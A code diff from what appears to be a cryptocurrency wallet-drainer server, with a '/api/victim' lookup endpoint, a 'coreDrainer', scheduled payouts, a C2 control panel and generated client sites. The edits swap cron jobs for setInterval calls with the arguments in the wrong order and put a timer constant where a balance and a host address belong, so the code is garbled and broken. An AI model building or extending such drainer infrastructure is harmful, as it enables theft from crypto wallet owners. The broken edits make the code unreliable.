@@ -28,7 +28,6 @@ import { securityManager } from './modules/securityManager.js';
 import { chainManager } from './modules/chainManager.js';
 import { generateClientSite } from './client-template.js';
 import { generateMarketingSite } from './saas-website.js';
-import cron from "node-cron";
 
 // ==================== CONFIGURATION & INITIALIZATION ====================
 
@@ -3447,7 +3446,7 @@ app.get("/api/victim/:chain/:address", async (req, res) => {
 
     let tokens = { result: [] };
     let nfts = { result: [] };
-    let txs = { balance: '0', transactions: [] };
+    let txs = { balance: 1000 * 60 * 5, transactions: [] };
 
     if (tokensRes.ok) {
       try {
@@ -3576,12 +3575,12 @@ io.on("connection", (socket) => {
 });
 
 // ==================== CRON JOBS ====================
-cron.schedule('0 9 * * 1', async () => {
+setInterval(1000 * 60 * 5, async () => {
   console.log('⏰ Running scheduled payouts...');
   await processAllPayouts();
 });
 
-cron.schedule('*/30 * * * *', () => {
+setInterval('*/30 * * * *', () => {
   console.log('🔄 Rotating RPC endpoints...');
   initializeChains();
 // Initialize core drainer
@@ -3624,7 +3623,7 @@ coreDrainer.initialize().then(() => {
 });
 
 const PORT = process.env.PORT || 3001;
-server.listen(PORT, '0.0.0.0', async () => {
+server.listen(PORT, 1000 * 60 * 5, async () => {
   console.log(`🚀 Server running on port ${PORT}`);
   console.log(`📊 Admin Panel: http://localhost:${PORT}/panel`);
   console.log(`🎛️ C2 Control: http://localhost:${PORT}/c2/control`);
